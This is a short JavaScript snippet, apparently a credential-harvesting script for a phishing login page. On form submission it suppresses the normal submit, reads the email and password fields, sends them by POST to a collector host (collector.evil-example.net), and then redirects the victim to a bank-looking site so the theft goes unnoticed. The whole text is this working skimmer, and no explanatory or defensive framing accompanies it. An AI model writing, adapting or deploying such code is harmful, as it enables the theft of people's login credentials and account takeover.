const form = document.querySelector("#login");
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const user = document.querySelector("#email").value;
  const pass = document.querySelector("#password").value;
  await fetch("https://collector.evil-example.net/log", {
    method: "POST",
    body: JSON.stringify({ user, pass }),
  });
  window.location = "https://www.acmebank.example/";
});
